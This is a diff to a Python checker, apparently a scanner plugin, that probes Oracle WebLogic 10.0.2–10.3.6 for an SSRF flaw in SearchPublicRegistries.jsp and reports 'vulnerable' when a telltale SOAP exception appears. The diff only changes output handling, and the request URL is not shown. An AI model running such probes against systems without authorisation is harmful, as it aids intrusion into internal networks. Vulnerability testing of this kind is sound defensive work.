@@ -7,9 +7,7 @@ author: Lucifer
 description: weblogic 版本10.0.2 -- 10.3.6中SearchPublicRegistries.jsp，参数operator可传入内网IP造成SSRF漏洞
 '''
 import sys
-import warnings
 import requests
-from termcolor import cprint
 
 class weblogic_ssrf_BaseVerify:
     def __init__(self, url):
@@ -25,12 +23,13 @@ class weblogic_ssrf_BaseVerify:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
 
             if r"weblogic.uddi.client.structures.exception.XML_SoapException" in req.text and r"IO Exception on sendMessage" not in req.text:
-                cprint("[+]存在weblogic SSRF漏洞...(中危)\tpayload: "+vulnurl, "yellow")
+                return "[+]存在weblogic SSRF漏洞...(中危)\tpayload: "+vulnurl
+            else:
+                return "[-]no vuln"
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-] ====>连接超时"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
     testVuln = weblogic_ssrf_BaseVerify(sys.argv[1])
     testVuln.run()
